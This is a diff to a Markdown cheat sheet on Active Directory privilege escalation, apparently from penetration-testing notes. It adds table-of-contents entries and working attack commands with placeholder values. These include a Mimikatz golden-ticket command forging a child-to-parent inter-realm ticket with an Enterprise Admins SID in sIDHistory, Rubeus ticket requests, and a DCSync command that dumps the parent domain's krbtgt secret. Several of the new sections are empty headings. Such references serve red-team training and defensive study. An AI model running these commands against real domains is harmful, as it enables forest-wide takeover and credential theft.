@@ -1,4 +1,3 @@
-
 ## AD Privilege Escalation
 
 - [Kerberoasting](#kerberoasting)
@@ -7,12 +6,22 @@
 - [Targeted Kerberoasting AS-REPs](#targeted-kerberoasting-as-reps)
     + [Enumerating accounts with Kerberos Preauth disabled](#enumerating-accounts-with-kerberos-preauth-disabled)
     + [Disable Kerberos Preauth](#disable-kerberos-preauth)
-    + [ASREPRoast : Request Encrypted AS-REP for Offline Brute Force](#asreproast---request-encrypted-as-rep-for-offline-brute-force)
+    + [ASREPRoast](#asreproast)
 - [Targeted Kerberoasting Set SPN](#targeted-kerberoasting-set-spn)
 - [Kerberos Delegation](#kerberos-delegation)
-    + [Uncostrained Delegation](#uncostrained-delegation)
+  * [Uncostrained Delegation](#uncostrained-delegation)
     + [Printer Bug](#printer-bug)
   * [Constrained Delegation](#constrained-delegation)
+    + [Resource Based RBCD](#resource-based-rbcd)
+- [DNSAdmins](#dnsadmins)
+- [Escalate Across Trusts](#escalate-across-trusts)
+    + [Child to Parent using sIDHistory](#child-to-parent-using-sidhistory)
+    + [Child to Parent Using krbtgt Hash](#child-to-parent-using-krbtgt-hash)
+    + [Across Forest Using Trust Tickets](#across-forest-using-trust-tickets)
+- [Across Domain Trusts AD Certificate Services](#across-domain-trusts-ad-certificate-services)
+    + [ESC1](#esc1)
+    + [ESC3](#esc3)
+    + [ESC6](#esc6)
 
 ### Kerberoasting
 ---
@@ -194,7 +203,7 @@ C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> 
 ---
 ### Escalate Across Trusts
 ---
-##### Child to Parent 
+##### Child to Parent using sIDHistory
 ```powershell
 #`sIDHistory` (sids below) is a user attribute designed for scenarios where a user is moved from one domain to another. 
 # When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
@@ -221,11 +230,25 @@ C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<dom
 
 # Create a TGS using the created ticket
 C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
+```
+##### Child to Parent Using krbtgt Hash
+```powershell
+# With the krbtgt hash for child domain, create a inter realm TGT and inject in the process
+C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_Domain> /sid:<child_Domain_sid> 
+                               /sids:<target_domain_sid>-519 /krbtgt:<child_domain_krbtgt_hash> /ptt" "exit"'
 
+# Extract secrets from parent domain
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent_Domain>\krbtgt /domain:<parent_Domain_fqdn>" "exit"'
 ```
 
-##### Across Forest
 
-##### Across Domain Trusts AD CS
+##### Across Forest Using Trust Tickets
 
-### MS SQL Servers
+### Across Domain Trusts AD Certificate Services
+---
+
+##### ESC1
+
+##### ESC3
+##### ESC6
+
